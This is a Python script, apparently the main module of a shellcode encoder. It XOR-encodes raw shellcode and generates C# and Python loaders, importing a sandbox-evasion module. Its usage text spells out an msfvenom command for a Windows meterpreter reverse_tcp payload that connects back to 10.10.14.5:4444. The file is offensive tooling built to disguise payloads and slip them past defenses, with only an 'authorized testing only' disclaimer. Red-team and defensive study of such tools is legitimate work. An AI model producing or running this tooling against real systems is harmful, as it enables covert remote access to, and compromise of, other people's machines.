#!/usr/bin/env python3
import sys
import os
from encoders.xor_encoder import XOREncoder
from loaders.csharp_loader import CSharpLoader
from loaders.python_loader import PythonLoader
from evasion.sandbox_checks import SandboxEvasion

class ShellcodeEncoder:
    """Main shellcode encoding and loader generation"""
    
    def __init__(self, key=None):
        self.encoder = XOREncoder(key)
    
    def encode_shellcode(self, shellcode):
        """Encode shellcode with XOR"""
        return self.encoder.encode(shellcode)
    
    def generate_loaders(self, encoded_shellcode, output_dir='.'):
        """Generate all loader types"""
        key = self.encoder.get_key()
        
        # C# loader
        csharp = CSharpLoader.generate(encoded_shellcode, key)
        csharp_file = os.path.join(output_dir, 'shellcode_loader.cs')
        with open(csharp_file, 'w') as f:
            f.write(csharp)
        print(f"[+] C# loader: {csharp_file}")
        
        # Python loader
        python = PythonLoader.generate(encoded_shellcode, key)
        python_file = os.path.join(output_dir, 'shellcode_loader.py')
        with open(python_file, 'w') as f:
            f.write(python)
        print(f"[+] Python loader: {python_file}")
        
        return {
            'csharp': csharp_file,
            'python': python_file,
            'key': key
        }

def main():
    if len(sys.argv) < 2:
        print("Usage: python3 main.py <shellcode_file> [output_dir]")
        print("Example: python3 main.py shellcode.bin loaders/")
        print("\n[!] For authorized security testing only")
        print("\nGenerate shellcode with msfvenom:")
        print("  msfvenom -p windows/x64/meterpreter/reverse_tcp \\")
        print("    LHOST=10.10.14.5 LPORT=4444 -f raw > shellcode.bin")
        sys.exit(1)
    
    shellcode_file = sys.argv[1]
    output_dir = sys.argv[2] if len(sys.argv) > 2 else '.'
    
    # Read shellcode
    print(f"[*] Reading shellcode: {shellcode_file}")
    with open(shellcode_file, 'rb') as f:
        shellcode = f.read()
    
    print(f"[*] Shellcode size: {len(shellcode)} bytes")
    
    # Encode
    encoder = ShellcodeEncoder()
    print(f"[*] Encoding shellcode...")
    encoded = encoder.encode_shellcode(shellcode)
    
    # Generate loaders
    print(f"[*] Generating loaders...")
    results = encoder.generate_loaders(encoded, output_dir)
    
    print(f"\n[+] Encoding complete!")
    print(f"[*] XOR Key: {results['key']}")
    print(f"\n[*] Compile C# with:")
    print(f"    {CSharpLoader.get_compile_instructions()}")
    
    print(f"\n[!] WARNING: For authorized testing only!")

if __name__ == "__main__":
    main()